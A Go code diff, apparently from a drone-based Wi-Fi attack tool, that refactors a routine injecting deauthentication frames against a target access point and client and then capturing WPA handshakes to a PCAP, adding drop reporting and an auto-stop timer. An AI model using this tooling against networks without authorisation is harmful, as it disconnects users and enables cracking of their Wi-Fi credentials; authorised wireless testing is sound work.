@@ -62,13 +62,14 @@ func runDeauthWithListen(client *drone.ControlClient, frameHex string) {
 		fmt.Printf("    Tip: add --filter-bssid %s to keep the PCAP small.\n", deauthBSSID)
 	}
 
-	fmt.Printf("[+] Injecting %d deauth frames (Interval: %dms)...\n", deauthCount, deauthInterval)
+	fmt.Printf("[+] Injecting %d %s frames (Interval: %dms)...\n",
+		deauthCount, frameKind(), deauthInterval)
 	fmt.Printf("    AP (BSSID) : %s\n", deauthBSSID)
 	fmt.Printf("    Client     : %s\n", destLabel)
 	fmt.Printf("    Channel    : %d\n", deauthChannel)
 
 	txBefore, txBeforeOK := readInjectFrames(client)
-	sent, queued, failed, err := client.SendInjection(frameHex, deauthCount, deauthInterval)
+	res, err := client.InjectFrame(frameHex, deauthCount, deauthInterval, 0)
 	if err != nil {
 		fmt.Printf("[!] Injection failed: %v\n", err)
 		if filterApplied {
@@ -77,22 +78,31 @@ func runDeauthWithListen(client *drone.ControlClient, frameHex string) {
 		os.Exit(1)
 	}
 
-	fmt.Printf("[+] Injection queued: %d frame(s) (accepted synchronously: %d, failed: %d)\n",
-		queued, sent, failed)
-	if queued > 0 {
-		if err := waitForTxDrain(client, 5*time.Second); err != nil {
+	fmt.Printf("[+] Injection queued: %d frame(s) (accepted synchronously: %d, dropped: %d, pending: %d)\n",
+		res.Queued, res.Sent, res.Failed, res.Pending)
+	if res.Failed > 0 {
+		fmt.Printf("[!] %d frame(s) were dropped by the drone TX ring (max %d).\n",
+			res.Failed, res.QueueMax)
+	}
+	if res.Pending > 0 {
+		if err := waitForTxDrain(client, 10*time.Second); err != nil {
 			fmt.Printf("[!] Lost contact with the drone during TX: %v\n", err)
 			fmt.Println("    It may have reset — check `pwn4c discover` and its uptime.")
 			os.Exit(1)
 		}
 	}
-	reportTxDelta(client, txBefore, txBeforeOK, sent+queued)
+	reportTxDelta(client, txBefore, txBeforeOK, res.Sent+res.Pending)
 
-	fmt.Printf("\n[+] Deauth sent — listening on channel %d for reconnections and handshakes.\n", deauthChannel)
-	fmt.Println("    Press Ctrl+C to stop. Open the capture with:")
+	fmt.Printf("\n[+] %s sent — listening on channel %d for reconnections and handshakes.\n",
+		frameKind(), deauthChannel)
+	if deauthSeconds > 0 {
+		fmt.Printf("    Auto-stop after %d seconds. Open the capture with:\n", deauthSeconds)
+	} else {
+		fmt.Println("    Press Ctrl+C to stop. Open the capture with:")
+	}
 	fmt.Printf("    wireshark -r %s   (filter: eapol || wlan.fc.type_subtype == 0x0c)\n", outPath)
 
-	waitForInterrupt()
+	waitForInterruptOrTimeout(deauthSeconds)
 
 	fmt.Println("\n[*] Stopping capture session...")
 	if filterApplied {
@@ -100,9 +110,7 @@ func runDeauthWithListen(client *drone.ControlClient, frameHex string) {
 			fmt.Printf("[!] Warning: failed to clear BPF filter: %v\n", err)
 		}
 	}
-	if err := client.StopMonitor(); err != nil {
-		fmt.Printf("[!] Warning: failed to stop monitor mode: %v\n", err)
-	}
+	stopMonitorIfActive(client)
 	_ = receiver.Close()
 
 	fmt.Printf("[+] Capture saved: %s (%d frames)\n", outPath, frameCount)
@@ -112,5 +120,23 @@ func runDeauthWithListen(client *drone.ControlClient, frameHex string) {
 func waitForInterrupt() {
 	sigCh := make(chan os.Signal, 1)
 	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
+	defer signal.Stop(sigCh)
 	<-sigCh
+}
+
+// waitForInterruptOrTimeout blocks until Ctrl+C / SIGTERM, or returns after
+// seconds when a positive capture duration was requested.
+func waitForInterruptOrTimeout(seconds int) {
+	if seconds <= 0 {
+		waitForInterrupt()
+		return
+	}
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
+	defer signal.Stop(sigCh)
+	select {
+	case <-sigCh:
+	case <-time.After(time.Duration(seconds) * time.Second):
+		fmt.Println("\n[*] Capture duration elapsed.")
+	}
 }
